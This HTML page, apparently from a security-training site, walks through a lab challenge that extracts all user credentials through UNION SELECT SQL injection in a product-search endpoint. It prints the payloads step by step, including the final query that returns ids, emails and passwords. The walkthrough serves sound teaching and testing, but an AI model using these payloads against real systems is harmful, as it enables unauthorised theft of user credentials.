<!DOCTYPE html>
<html lang="en">

<head>
    <title>ASET - User credentials attack</title>
    <link rel="stylesheet" type="text/css" href="../../style/style.css">
    <link href="https://fonts.googleapis.com/css?family=Courgette&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Francois+One&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Merriweather:300,300i,400,400i,700,700i,900,900i&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <meta charset="UTF-8">
</head>

<body>
    <div class="navbar">
        <div class="navbar-right">
            <a href="../../index.html">Home</a>
            <a href="../../tools/tools.html">Tools</a>
            <a style="color: #7FFF00;" href="../../attacks/Injection/injection.html">Injection</a>
        </div>
    </div>

    <div class="titlu">
        <h1>Retrieve a list of all user credentials <br> via SQL Injection</h1>
    </div>
    <br><br>
    <p>
        This challenge explains how a considerable number of companies were affected by data breaches 
        without anyone breaking into the server room or sneaking out with a USB stick full of sensitive
         information. Given your application is vulnerable to a certain type of SQL Injection attacks, 
         hackers can have the same effect while comfortably sitting in a caf√© with free WiFi.
    </p>
    <ul>
        <li>Try to find an endpoint where you can influence data being retrieved from the server. </li>
        <li>Craft a UNION SELECT attack string to join data from another table into the original result.</li>
        <li>You might have to tackle some query syntax issues step-by-step, basically hopping from one error to the next</li>
        <li>As with Order the Christmas special offer of 2014 and Exfiltrate the entire DB schema definition via SQL Injection 
            this cannot be achieved through the application frontend.</li>
    </ul>
    <p>
        Steps:
    </p>
    <ul>
        <li>During the Order the Christmas special offer of 2014 challenge you learned that the /rest/products/search endpoint 
            is susceptible to SQL Injection into the q parameter.</li>
        <li>The attack payload you need to craft is a UNION SELECT merging the data from the user's DB table into the products
             returned in the JSON result.</li>
        <li>As a starting point we use the known working '))-- attack pattern and try to make a UNION SELECT out of it</li>
        <li>Searching for ')) UNION SELECT * FROM x-- fails with a SQLITE_ERROR: no such table: x as you would expect. But we 
            can easily guess the table name or infer it from one of the previous attacks on the Login form where even the 
            underlying SQL query was leaked.</li>
        <li>Searching for ')) UNION SELECT * FROM Users-- fails with a promising SQLITE_ERROR: SELECTs to the left and right
             of UNION do not have the same number of result columns which least confirms the table name.</li>
        <li>The next step in a UNION SELECT-attack is typically to find the right number of returned columns. As the Search
             Results table in the UI has 3 columns displaying data, it will probably at least be three. You keep adding columns 
             until no more SQLITE_ERROR occurs (or at least it becomes a different one):
            <ul>
                <li>')) UNION SELECT '1' FROM Users-- fails with number of result columns error</li>
                <li>(...)</li>
                <li>')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM Users-- still fails with number of result columns error</li>
                <li>')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users-- finally gives you a JSON response back with an 
                extra element {"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":
                "8","deletedAt":"9"}.</li>
            </ul>
        <li>Next you get rid of the unwanted product results changing the query into something like qwert')) UNION SELECT '1', '2', '3',
             '4', '5', '6', '7', '8', '9' FROM Users-- leaving only the "UNIONed" element in the result set</li>
        <li>The last step is to replace the fixed values with correct column names. You could guess those or derive them from the RESTful 
            API results or remember them from previously seen SQL errors while attacking the Login form.</li>
        <li>Searching for qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users-- solves the challenge giving 
            you a the list of all user data in convenient JSON format.</li>
        </ul>

        <ul class="liste">
            <li><a href="databaseSchema.mp4" target="_blank">Demo</a></li>
        </ul>
</body>

</html>